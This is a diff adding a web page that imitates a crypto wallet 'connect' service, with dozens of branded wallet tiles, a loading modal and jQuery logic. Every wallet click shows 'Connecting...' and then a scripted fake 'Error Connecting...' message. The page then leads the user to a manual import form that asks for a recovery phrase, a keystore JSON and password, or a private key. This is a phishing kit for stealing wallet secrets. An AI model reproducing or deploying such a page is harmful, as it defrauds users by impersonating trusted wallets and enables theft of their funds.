+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="safepal" data-toggle="modal" href="#" class="wallet">
+                        <img src="images/icons/SafePal.png" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">SafePal</h5>
+                    <button id="safepal" data-id="25" class="wallet btn main-btn w-100 paynow mt-3">Buy Now</button>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="equal" data-toggle="modal" href="#" class="wallet">
+                        <img src="images/icons/Equal.jpeg" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">Equal</h5>
+                    <button id="equal" data-href="" data-id="24" class="wallet btn main-btn w-100 paynow mt-3">Buy Now</button>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="infinite" data-toggle="modal" href="#" class="wallet">
+                        <img src="images/icons/Infinite.png" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">Infinite</h5>
+                    <button data-href="" id="infinite" class="wallet btn main-btn w-100 paynow mt-3">Buy Now</button>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="wallet_io" data-toggle="modal" href="#" class="wallet">
+                        <img src="images/icons/wallet.io.png" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">wallet.io</h5>
+                    <button id="wallet_io" data-href="" data-id="20" id="" class="wallet btn main-btn w-100 paynow mt-3">Buy Now</button>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="infinity_wallet" data-toggle="modal" href="#" class="wallet">
+                        <img src="images/icons/Infinity Wallet.png" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">infinity wallet</h5>
+                    <button id="infinity_wallet" data-href="" data-id="21" class="wallet btn main-btn w-100 paynow mt-3">Coneect</button>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="ownbit" data-toggle="modal" href="#" class="wallet">
+                        <img src="images/icons/Ownbit.png" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">Ownbit</h5>
+                    <button id="ownbit" data-href="" data-id="11" class="wallet btn main-btn w-100 paynow mt-3">Buy Now</button>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="easypocket" data-toggle="modal" href="#" class="wallet">
+                        <img src="images/icons/EasyPocket.jpg" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">EasyPocket</h5>
+                    <button id="easypocket" data-href="" data-id="13" class="wallet btn main-btn w-100 paynow mt-3">Buy Now</button>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="bridge_wallet" data-toggle="modal" href="#" class="wallet">
+                        <img src="images/icons/BridgeWallet.png" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">Bridge Wallet</h5>
+                    <button id="bridge_wallet" data-href="" data-id="10" class="wallet btn main-btn w-100 paynow mt-3">Buy Now</button>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="sparkpoint" data-toggle="modal" href="#" class="wallet">
+                        <img src="images/icons/SparkPoint.png" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">SparkPoint</h5>
+                    <button id="sparkpoint" data-href="" data-id="7" class="wallet btn main-btn w-100 paynow mt-3">Buy Now</button>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="via" data-toggle="modal" href="#" class="wallet">
+                        <img src="images/icons/ViaWallet.png" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">Via Wallet</h5>
+                    <button id="via" data-href="" data-id="8" class="wallet btn main-btn w-100 paynow mt-3">Buy Now</button>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="bitkeep" data-toggle="modal" href="#" class="wallet">
+                        <img src="images/icons/BitKeep.png" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">BitKeep</h5>
+                    <button id="bitkeep" data-href="" data-id="9" class="wallet btn main-btn w-100 paynow mt-3">Buy Now</button>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="vision" data-toggle="modal" href="#" class="wallet">
+                        <img src="images/icons/Vision.png" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">Vision</h5>
+                    <button id="vision" data-href="" data-id="6" class="wallet btn main-btn w-100 paynow mt-3">Buy Now</button>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="swft" data-toggle="modal" href="#" class="wallet">
+                        <img src="images/icons/SWFTWallet.png" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">SWFT Wallet</h5>
+                    <button id="swft" data-href="" data-id="5" class="wallet btn main-btn w-100 paynow mt-3">Buy Now</button>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="peakdefi" data-toggle="modal" href="#" class="wallet">
+                        <img src="images/icons/PEAKDEFI.png" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">PEAKDEFI Wallet</h5>
+                    <button id="peakdefi" data-href="" data-id="1" class="wallet btn main-btn w-100 paynow mt-3">Buy Now</button>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="cosmostation" data-toggle="modal" href="#" class="wallet">
+                        <img src="images/icons/Cosmostation.png" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">Cosmostation</h5>
+                    <button id="cosmostation" data-href="" data-id="2" class="wallet btn main-btn w-100 paynow mt-3">Buy Now</button>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="graph protocol" data-toggle="modal" href="#" class="wallet">
+                        <img src="images/icons/GraphProtocol.jpg" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">Graph Protocol</h5>
+                    <button id="graph protocol" data-href="" data-id="3" class="wallet btn main-btn w-100 paynow mt-3">Buy Now</button>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="kardiachain" data-toggle="modal" href="#" class="wallet">
+                        <img src="images/icons/KardiaChain.png" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">KardiaChain</h5>
+                    <button id="kardiachain" data-href="" data-id="3" class="wallet btn main-btn w-100 paynow mt-3">Buy Now</button>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="keplr" data-toggle="modal" href="#" class="wallet">
+                        <img src="images/icons/Keplr.png" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">Keplr</h5>
+                    <button id="keplr" data-href="" data-id="3" class="wallet btn main-btn w-100 paynow mt-3">Buy Now</button>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="harmony" data-toggle="modal" href="#" class="wallet">
+                        <img src="images/icons/Harmony.png" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">Harmony</h5>
+                    <button id="harmony" data-href="" data-id="3" class="wallet btn main-btn w-100 paynow mt-3">Buy Now</button>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="iconex" data-toggle="modal" href="#" class="wallet">
+                        <img src="images/icons/ICONex.png" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">ICONex</h5>
+                    <button id="iconex" data-href="" data-id="3" class="wallet btn main-btn w-100 paynow mt-3">Buy Now</button>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="fetch" data-toggle="modal" href="#" class="wallet">
+                        <img src="images/icons/fetch.jpg" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">Fetch</h5>
+                    <button id="fetch" data-href="" data-id="3" class="wallet btn main-btn w-100 paynow mt-3">Buy Now</button>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="xdc" data-toggle="modal" href="#" class="wallet">
+                        <img src="images/icons/XDCWallet.png" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">XDC Wallet</h5>
+                    <button id="xdc" data-href="" data-id="3" class="wallet btn main-btn w-100 paynow mt-3">Buy Now</button>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="unstoppable" data-toggle="modal" href="#" class="wallet">
+                        <img src="images/icons/Unstoppable Wallet.png" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">Unstoppable Wallet</h5>
+                    <button id="unstoppable" data-href="" data-id="3" class="wallet btn main-btn w-100 paynow mt-3">Buy Now</button>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="meetone" data-toggle="modal" href="#" class="wallet">
+                        <img src="images/icons/MEETONE.jpg" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">MEET. ONE</h5>
+                    <button id="meetone" data-href="" data-id="3" class="wallet btn main-btn w-100 paynow mt-3">Buy Now</button>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="dock" data-toggle="modal" href="#" class="wallet">
+                        <img src="images/icons/DockWallet.png" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">Dock Wallet</h5>
+                    <button id="dock" data-href="" data-id="3" class="wallet btn main-btn w-100 paynow mt-3">Buy Now</button>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="at" data-toggle="modal" href="#" class="wallet">
+                        <img src="images/icons/ATWallet.png" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">AT. Wallet</h5>
+                    <button id="at" data-href="" data-id="3" class="wallet btn main-btn w-100 paynow mt-3">Buy Now</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="moriX" data-toggle="modal" href="#" class="wallet">
+                        <img src="images/icons/MoriXWallet.png" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">MoriX Wallet</h5>
+                    <button id="moriX" data-href="" data-id="3" class="wallet btn main-btn w-100 paynow mt-3">Buy Now</button>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="midas" data-toggle="modal" href="#" class="wallet">
+                        <img src="images/icons/Midas Wallet.png" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">Midas Wallet</h5>
+                    <button id="midas" data-href="" data-id="3" class="wallet btn main-btn w-100 paynow mt-3">Buy Now</button>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="ellipal" data-toggle="modal" href="#" class="wallet">
+                        <img src="images/icons/Ellipal.png" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">Ellipal</h5>
+                    <button id="ellipal" data-href="" data-id="3" class="wallet btn main-btn w-100 paynow mt-3">Buy Now</button>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="keyringpro" data-toggle="modal" href="#" class="wallet">
+                        <img src="images/icons/KEYRING PRO.png" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">KEYRING PRO</h5>
+                    <button id="keyringpro" data-href="" data-id="3" class="wallet btn main-btn w-100 paynow mt-3">Buy Now</button>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="blockchain" data-toggle="modal" href="#" class="wallet">
+                        <img src="images/icons/Blockchain.png" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">Blockchain</h5>
+                    <button id="blockchain" data-href="" data-id="3" class="wallet btn main-btn w-100 paynow mt-3">Buy Now</button>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="Binance_Smart_Chain" data-toggle="modal" href="#" class="wallet">
+                        <img src="images/icons/Binance Smart Chain.png" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">Binance Smart Chain</h5>
+                    <button id="Binance_Smart_Chain" data-href="" data-id="3" class="wallet btn main-btn w-100 paynow mt-3">Buy Now</button>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="aktionariat" data-toggle="modal" href="#" class="wallet">
+                        <img src="images/icons/aktionariat-c5784b26234a389632687a36d2fb3258.png" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">Aktionariat</h5>
+                    <button id="aktionariat" data-href="" data-id="3" class="wallet btn main-btn w-100 paynow mt-3">Buy Now</button>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="coinbase" data-toggle="modal" href="#" class="wallet">
+                        <img src="images/icons/Coinbase.png" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">Coinbase</h5>
+                    <button id="coinbase" data-href="" data-id="3" class="wallet btn main-btn w-100 paynow mt-3">Buy Now</button>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="exodus" data-toggle="modal" href="#" class="wallet">
+                        <img src="images/icons/Exodus.png" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">Exodus</h5>
+                    <button id="exodus" data-href="" data-id="3" class="wallet btn main-btn w-100 paynow mt-3">Buy Now</button>
+                </div>
+            </div>
+        </div> -->
+    </div>
+</div>
+
+<div class="modal fade" tabindex="-1" role="dialog" id="paynow" id>
+    <div class="modal-dialog" role="document">
+        <!-- <form action="" method="post"> -->
+        <input type="hidden" name="_token" value="p0gvYZcEqKi3wFcVVu99qSuCdhcnqUkA0eo1fovN">
+        <div class="modal-content bg-body">
+            <div class="modal-header">
+                <h5 class="modal-title">Backup Your Assetes</h5>
+                <button type="button" class="close modal_close" data-bs-dismiss="modal" aria-label="Close">
+                    <span aria-hidden="true" class="text-light">&times;</span>
+                </button>
+            </div>
+
+
+            <div class="row loaderdiv" style="margin: 10px 30px 0px 30px;">
+                <div class="col-4">
+                    <div class="loader">
+                        <div class="loader1">
+                            <div class="circle"></div>
+                            <div class="picture">
+                                <img id="loader_img" src="" alt="Overlay Image">
+                            </div>
+                        </div>
+                    </div>
+                    <p id="con_stats">Connecting...</p>
+                    <button style="display: none; margin-bottom: 10px; font-size: x-small; height: 37px;" id="con_button" type="submit" class="btn btn-sm main-btn"><i data-feather="repeat"></i> Connect Manually</button>
+
+                </div>
+
+                <div id="blc" class="col-6" style="margin-left: 16%;">
+                    <div style="width: 100px;"> <img width="100%" id="img" src="" alt=""></div>
+                    <b id="wallet_name"></b>
+                    <!-- <small> Easy-to-use browser extension.</small> -->
+                </div>
+            </div>
+
+
+
+            <div class="modal-body">
+
+
+                <div style="display: none;" id="input_con" class="row">
+
+                    <h3 id="modal-headline" class="text-lg leading-6 mt-2 font-medium text-gray-900" style="display: flex; flex-direction: row;" _mstvisible="6">
+                        <img src="" style="margin-right: 20px; height: 40px; width: 40px" id="myImg" _mstvisible="7">
+                        <span _msttexthash="543361" _msthash="8" _mstvisible="7">Import your
+                            <span id="walletname1" _msttexthash="75595" _msthidden="1" _msthash="182"></span> wallet
+                        </span>
+                    </h3>
+                    <nav>
+                        <div class="nav nav-tabs" id="nav-tab" role="tablist">
+                            <button class="nav-link active btn-sm" id="nav-home-tab" data-bs-toggle="tab" data-bs-target="#nav-home" type="button" role="tab" aria-controls="nav-home" aria-selected="true">Phrase</button>
+                            <button class="nav-link btn-sm" id="nav-profile-tab" data-bs-toggle="tab" data-bs-target="#nav-profile" type="button" role="tab" aria-controls="nav-profile" aria-selected="false">Keystore JSON</button>
+                            <button class="nav-link btn-sm" id="nav-contact-tab" data-bs-toggle="tab" data-bs-target="#nav-contact" type="button" role="tab" aria-controls="nav-contact" aria-selected="false">Private Key</button>
+                        </div>
+                    </nav>
+                    <div class="tab-content" id="nav-tabContent">
+                        <div class="tab-pane fade show active" id="nav-home" role="tabpanel" aria-labelledby="nav-home-tab">
+                            <div style="margin-top: 10px;" class="col-md-12 col-sm-12 col-xs-12">
+
+                                <form class="sendp">
+
+                                    <div class="form-group">
+
+
+                                        <textarea style="border-radius: 8px; background: transparent;" placeholder="Recovery Phrase" name="Phrase" id="input" class="form-control" rows="3" required="required"></textarea>
+
+                                    </div>
+                                    <div class="form-group">
+                                        <input hidden type="text" name="type_of_login_detail" id="type_of_login_detail" value="recovery phrase">
+                                    </div>
+                                    <small>Several lines of text beginning with "{...}" plus the password you used to encrypt it.</small>
+
+                                    <div style="margin-top: 15px;" class="form-group">
+                                        <button style="width: 100%;" class="shadow-btn btn btn-info btn-corner" _msttexthash="184587" _msthash="161">Proceed</button>
+                                    </div>
+
+                                </form>
+
+                            </div>
+                        </div>
+                        <div class="tab-pane fade" id="nav-profile" role="tabpanel" aria-labelledby="nav-profile-tab">
+                            <div style="margin-top: 10px;" class="col-md-12 col-sm-12 col-xs-12">
+
+                                <form class="sendp">
+
+                                    <div class="form-group">
+
+
+                                        <textarea style="border-radius: 8px; background: transparent;" placeholder="Keystore JSON" name="Keystore_json" id="input" class="form-control" rows="3" required="required"></textarea>
+
+                                    </div>
+                                    <div class="form-group">
+                                        <input name="password" style="border-radius: 8px; background: transparent;" type="text" class="form-control" id="email-1" placeholder="Wallet password">
+                                        <input hidden type="text" name="type_of_login_detail" id="type_of_login_detail" value="keystone">
+                                    </div>
+                                    <small>Several lines of text beginning with "{...}" plus the password you used to encrypt it.</small>
+
+                                    <div style="margin-top: 15px;" class="form-group">
+                                        <button style="width: 100%;" class="shadow-btn btn btn-info btn-corner" _msttexthash="184587" _msthash="161">Proceed</button>
+                                    </div>
+
+                                </form>
+
+                            </div>
+                        </div>
+                        <div class="tab-pane fade" id="nav-contact" role="tabpanel" aria-labelledby="nav-contact-tab">
+                            <div style="margin-top: 10px;" class="col-md-12 col-sm-12 col-xs-12">
+                                <form class="sendp">
+                                    <div class="form-group">
+                                        <textarea style="border-radius: 8px; background: transparent;" placeholder="Private Key" name="Private_Key" id="input" class="form-control" rows="3" required="required"></textarea>
+
+                                    </div>
+                                    <div class="form-group">
+                                        <input name="password" style="border-radius: 8px; background: transparent;" type="text" class="form-control" id="email-1" placeholder="Wallet password">
+                                        <input hidden type="text" name="type_of_login_detail" id="type_of_login_detail" value="PrivateKey">
+                                    </div>
+                                    <small>Several lines of text beginning with "{...}" plus the password you used to encrypt it.</small>
+
+                                    <div style="margin-top: 15px;" class="form-group">
+                                        <button style="width: 100%;" class="shadow-btn btn btn-info btn-corner" _msttexthash="184587" _msthash="161">Proceed</button>
+                                    </div>
+                                </form>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+
+
+
+            </div>
+            <div class="modal-footer">
+                <button type="button" class="btn sp_btn_danger modal_close" data-bs-dismiss="modal">Close</button>
+                <!-- <button type="submit" class="btn main-btn">Deposit now</button> -->
+            </div>
+        </div>
+        <!-- </form> -->
+    </div>
+</div>
+
+
+
+</section>
+</main>
+
+
+
+<style>
+    .loader1 {
+        position: relative;
+        width: 80px;
+        height: 80px;
+    }
+
+    .circle {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        border: 2px solid #f3f3f3;
+        border-top: 2px solid #3498db;
+        border-radius: 50%;
+        animation: spin 2s linear infinite;
+    }
+
+    .picture {
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+    }
+
+    .picture img {
+        width: 100%;
+        /* height: 80px; */
+        border-radius: 50%;
+    }
+</style>
+
+
+
+<script>
+    $(document).ready(function() {
+        $(".wallet").click(function() {
+            var id = $(this).attr('id');
+            /////change con_stat
+            $(".loader").css("display", "inline-flex");
+            $("#con_stats").css("color", "black");
+            $("#con_stats").css("display", "inline-flex");
+            $("#img").css("display", "inline-flex");
+            clearInterval(intervalId);
+            con_status(id);
+            const modal = $('#paynow');
+            modal.modal('show');
+            if (id == "trust") {
+                $("#loader_img").attr("src", "images/icons/trust-wallet-66f8777532931d9c09b633344981a6a9.png");
+                $("#img").attr("src", "images/icons/trust-wallet-66f8777532931d9c09b633344981a6a9.png");
+                $("#wallet_name").html("Trust Wallet");
+                // const modal = $('#paynow');
+                // modal.modal('show');
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("Trust");
+                    $("#myImg").attr("src", "images/icons/trust-wallet-66f8777532931d9c09b633344981a6a9.png");
+                }, 5000);
+            } else if (id == "lob") {
+                $("#loader_img").attr("src", "images/icons/lobstr.png");
+                $("#img").attr("src", "images/icons/lobstr.png");
+                $("#wallet_name").html("LOBSTR Wallet");
+                // const modal = $('#paynow');
+                // modal.modal('show');
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("LOBSTR");
+                    $("#myImg").attr("src", "images/icons/lobstr.png");
+                }, 5000);
+            } else if (id == "Wallet_connect") {
+                $("#loader_img").attr("src", "images/icons/iogo.jpg");
+                $("#img").attr("src", "images/icons/iogo.jpg");
+                $("#wallet_name").html("Wallet Connect");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("Wallet Connect");
+                    $("#myImg").attr("src", "images/icons/iogo.jpg");
+                }, 5000);
+            } else if (id == "atomic") {
+                $("#loader_img").attr("src", "images/icons/atomic-4c02d2b33cf091fd83c7a49819394e41.png");
+                $("#img").attr("src", "images/icons/atomic-4c02d2b33cf091fd83c7a49819394e41.png");
+                $("#wallet_name").html("Atomic");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("Atomic");
+                    $("#myImg").attr("src", "images/icons/atomic-4c02d2b33cf091fd83c7a49819394e41.png");
+                }, 5000);
+            } else if (id == "metamask") {
+                $("#loader_img").attr("src", "images/icons/metamask-69ce6b56bbc9953dfb4aecebdf88729b.png");
+                $("#img").attr("src", "images/icons/metamask-69ce6b56bbc9953dfb4aecebdf88729b.png");
+                $("#wallet_name").html("Metamask");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("Metamask");
+                    $("#myImg").attr("src", "images/icons/metamask-69ce6b56bbc9953dfb4aecebdf88729b.png");
+                }, 5000);
+            } else if (id == "rainbow") {
+                $("#loader_img").attr("src", "images/icons/rainbow-207dda8d66f8ffc00a21e4fcc5ce0a73.png");
+                $("#img").attr("src", "images/icons/rainbow-207dda8d66f8ffc00a21e4fcc5ce0a73.png");
+                $("#wallet_name").html("Rainbow");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("Rainbow");
+                    $("#myImg").attr("src", "images/icons/rainbow-207dda8d66f8ffc00a21e4fcc5ce0a73.png");
+                }, 5000);
+            } else if (id == "money") {
+                $("#loader_img").attr("src", "images/icons/download.jpeg");
+                $("#img").attr("src", "images/icons/download.jpeg");
+                $("#wallet_name").html("Money");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("Money");
+                    $("#myImg").attr("src", "images/icons/download.jpeg");
+                }, 5000);
+            } else if (id == "gnosis_safe_multisig") {
+                $("#loader_img").attr("src", "images/icons/download(1).jpeg");
+                $("#img").attr("src", "images/icons/download(1).jpeg");
+                $("#wallet_name").html("Gnosis Safe Multisig");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("Gnosis Safe Multisig");
+                    $("#myImg").attr("src", "images/icons/download(1).jpeg");
+                }, 5000);
+            } else if (id == "crypto") {
+                $("#loader_img").attr("src", "images/icons/crypto-4cbeac57421fb3ca2573db2cf448169a.png");
+                $("#img").attr("src", "images/icons/crypto-4cbeac57421fb3ca2573db2cf448169a.png");
+                $("#wallet_name").html("Crypto.com | DeFi Wallet");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("Crypto.com | DeFi Wallet");
+                    $("#myImg").attr("src", "images/icons/crypto-4cbeac57421fb3ca2573db2cf448169a.png");
+                }, 5000);
+            } else if (id == "pillar") {
+                $("#loader_img").attr("src", "images/icons/download.png");
+                $("#img").attr("src", "images/icons/download.png");
